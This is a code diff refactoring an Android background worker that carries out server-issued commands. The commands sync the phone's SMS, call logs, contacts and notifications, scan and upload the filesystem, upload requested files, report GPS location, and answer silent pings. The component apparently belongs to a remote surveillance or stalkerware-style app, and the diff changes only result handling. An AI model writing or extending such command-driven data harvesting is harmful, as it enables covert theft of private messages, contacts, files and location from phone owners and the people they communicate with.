@@ -1,4 +1,3 @@
-// DataFetchWorker.kt
 package com.elfinsaddle.worker
 
 import android.Manifest
@@ -7,15 +6,10 @@ import android.content.pm.PackageManager
 import android.location.Location
 import android.util.Log
 import androidx.core.content.ContextCompat
-import androidx.work.CoroutineWorker
-import androidx.work.Data
-import androidx.work.Constraints
-import androidx.work.NetworkType
-import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.WorkerParameters
-import androidx.work.WorkManager
+import androidx.work.*
 import com.elfinsaddle.MainApplication
 import com.elfinsaddle.data.remote.ApiClient
+import com.elfinsaddle.data.remote.NetworkResult
 import com.elfinsaddle.data.repository.DeviceRepository
 import com.elfinsaddle.util.FileSystemManager
 import com.elfinsaddle.util.SystemInfoManager
@@ -34,10 +28,8 @@ class DataFetchWorker(
     companion object {
         private const val TAG = "DataFetchWorker"
         const val KEY_COMMAND = "command"
-
-        // Commands
         const val COMMAND_SYNC_ALL = "sync_all"
-        const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications" // <-- ADDED
+        const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications"
         const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
         const val COMMAND_GET_LOCATION = "get_location"
         const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
@@ -87,7 +79,7 @@ class DataFetchWorker(
     private suspend fun executeCommand(command: String): Boolean {
         return when (command) {
             COMMAND_SYNC_ALL -> syncAllData()
-            COMMAND_SYNC_NOTIFICATIONS -> deviceRepository.syncNotifications() // <-- ADDED
+            COMMAND_SYNC_NOTIFICATIONS -> deviceRepository.syncNotifications() is NetworkResult.Success
             COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
             COMMAND_GET_LOCATION -> fetchAndSendLocation()
             COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
@@ -103,12 +95,19 @@ class DataFetchWorker(
 
     private suspend fun syncAllData(): Boolean {
         Log.i(TAG, "Starting full differential data sync...")
-        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms() else true
-        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) deviceRepository.syncCallLogs() else true
-        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) deviceRepository.syncContacts() else true
-        val notificationsSuccess = deviceRepository.syncNotifications() // <-- ADDED
+        val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) {
+            deviceRepository.syncSms() is NetworkResult.Success
+        } else true
+        val callLogSuccess = if (hasPermission(Manifest.permission.READ_CALL_LOG)) {
+            deviceRepository.syncCallLogs() is NetworkResult.Success
+        } else true
+        val contactsSuccess = if (hasPermission(Manifest.permission.READ_CONTACTS)) {
+            deviceRepository.syncContacts() is NetworkResult.Success
+        } else true
+        val notificationsSuccess = deviceRepository.syncNotifications() is NetworkResult.Success
+
         Log.i(TAG, "Full sync results -> SMS: $smsSuccess, CallLogs: $callLogSuccess, Contacts: $contactsSuccess, Notifications: $notificationsSuccess")
-        return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess // <-- MODIFIED
+        return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess
     }
 
     private suspend fun uploadRequestedFile(): Boolean {
@@ -119,7 +118,8 @@ class DataFetchWorker(
             return false
         }
         val deviceId = systemInfoManager.getDeviceId()
-        return apiClient.uploadRequestedFile(file, deviceId, filePath)
+        val result = apiClient.uploadRequestedFile(file, deviceId, filePath)
+        return result is NetworkResult.Success
     }
 
     private suspend fun downloadFileFromServer(): Boolean {
@@ -132,27 +132,28 @@ class DataFetchWorker(
         if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return true
         val location = getCurrentLocation()
         val message = if (location != null) "Lat=${location.latitude}, Lon=${location.longitude}" else "Not available"
-        return apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "location", message)
+        val result = apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "location", message)
+        return result is NetworkResult.Success
     }
 
     private suspend fun fetchAndSendSystemInfo(): Boolean {
         val batteryInfo = systemInfoManager.getBatteryStatus()
         val message = "Net=${systemInfoManager.getNetworkType()}, Batt=${batteryInfo.percentage}% (${batteryInfo.status})"
-        return apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "system_info", message)
+        val result = apiClient.sendStatusUpdate(systemInfoManager.getDeviceId(), "system_info", message)
+        return result is NetworkResult.Success
     }
 
     private suspend fun sendPingResponse(): Boolean {
         val isSilent = inputData.getString(KEY_IS_SILENT)?.toBoolean() ?: false
-
         val message = "Pong! Device online at ${System.currentTimeMillis()}"
         val extras = mapOf("isSilent" to isSilent)
-
-        return apiClient.sendStatusUpdate(
+        val result = apiClient.sendStatusUpdate(
             deviceId = systemInfoManager.getDeviceId(),
             statusType = "ping",
             message = message,
             extras = extras
         )
+        return result is NetworkResult.Success
     }
 
     private fun hasPermission(permission: String): Boolean =
